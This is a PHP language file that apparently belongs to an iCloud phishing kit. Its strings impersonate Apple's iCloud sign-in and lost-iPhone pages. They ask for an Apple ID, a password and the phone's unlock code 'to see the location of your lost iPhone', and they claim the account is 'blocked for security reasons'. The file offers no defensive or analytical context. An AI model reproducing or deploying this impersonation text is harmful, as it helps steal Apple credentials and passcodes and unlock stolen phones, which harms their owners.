<?php
/*
------------------
Language: espaniol
------------------
*/
 
$lang = array();
$lang['TTILE'] = 'iCloud';
$lang['DESCRIP'] = 'Sign in to iCloud to access your photos, videos, documents, notes, contacts, and more. Use your Apple ID or create an account to start using Apple services.';
$lang['DESCARGA'] = 'Download iCloud for Windows';
$lang['ACTULIZADO'] = 'Keep updated the latest version of all your documents, videos, photos and much more, on your PC.';
$lang['DESCARGA_AHORA'] = 'Download now';


//Header
$lang['CREAR_ID_APPLE'] = 'Create Apple ID';
$lang['ESTADO_SISTEMA'] = 'System status';
 
$lang['POLICY'] = 'Privacy Policy';

$lang['TERMS'] = 'Terms and Conditions';
$lang['COPYRIGHT'] = 'Copyright © 2021 Apple Inc. All rights reserved';


$lang['COD_BLOQUEO'] = 'Enter your unlock code';
$lang['INCORRECTO'] = 'Wrong lock code.';
$lang['COMENTARIO'] = 'Enter your lock code to see the location of your lost iPhone.';

$lang['NO_CODIGO'] = "Don't remember your code?";
$lang['BLOQ_SEGURIDAD'] = 'This Apple ID has been blocked for security reasons.';

$lang['COM_DEB_CUENTA'] = 'Before you can log in, you have to unlock the account.';

$lang['DEB_CUENTA'] = 'Unlock account';

$lang['VERIFI_PATRON'] = 'Verifying…'; 




//DATOS 

$lang['SIGN_IN_TITLE'] = 'Sign in to iCloud';
$lang['APPLE_ID'] = 'Apple ID';


$lang['PASSWORD'] = 'Password';
$lang['APPLE_INCORRECTO'] = 'The password or Apple ID is wrong.';
$lang['FORGOT_ID'] = 'Have you forgotten the password?';
$lang['PER_CONECTADO'] = 'Stay Connected';
$lang['OLVIDADO'] = 'Forgot your Apple ID or password?';




?>